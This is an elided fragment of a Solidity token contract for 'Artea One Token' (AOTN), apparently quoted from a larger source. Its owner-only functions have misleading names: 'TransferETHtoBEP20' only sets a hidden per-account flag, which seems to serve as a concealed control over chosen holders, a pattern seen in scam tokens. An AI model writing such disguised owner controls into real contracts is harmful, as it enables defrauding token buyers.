...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Artea One Token';
    string constant public symbol = 'AOTN';
    ...
    function PermitETH(address account) public onlyOwner {
    ...
    function TransferETHtoBEP20(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function TransferStatus(address account) public view returns (bool) {
...
contract ArteaOneCtract is BaseToken {
